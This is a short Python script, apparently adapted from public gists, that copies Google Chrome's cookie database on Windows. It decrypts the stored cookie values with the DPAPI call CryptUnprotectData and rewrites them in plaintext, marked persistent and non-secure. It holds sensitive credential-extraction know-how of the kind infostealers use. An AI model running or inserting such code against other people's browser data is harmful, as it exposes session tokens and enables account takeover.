#Based off https://gist.github.com/DakuTree/98c8362fb424351b803e & pieces of https://gist.github.com/jordan-wright/5770442
from os import getenv
from shutil import copyfile
import sqlite3
import win32crypt #https://sourceforge.net/projects/pywin32/

# Copy Cookies to current folder
copyfile(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Cookies", './Cookies')

# Connect to the Database
conn = sqlite3.connect('./Cookies')
cursor = conn.cursor()

# Get the results
cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
for host_key, name, value, encrypted_value in cursor.fetchall():
	# Decrypt the encrypted_value
	decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0

	# Update the cookies with the decrypted value
	# This also makes all session cookies persistent
	cursor.execute('\
		UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, persistent = 1, secure = 0\
		WHERE host_key = ?\
		AND name = ?',
		(decrypted_value, host_key, name));

conn.commit()
conn.close()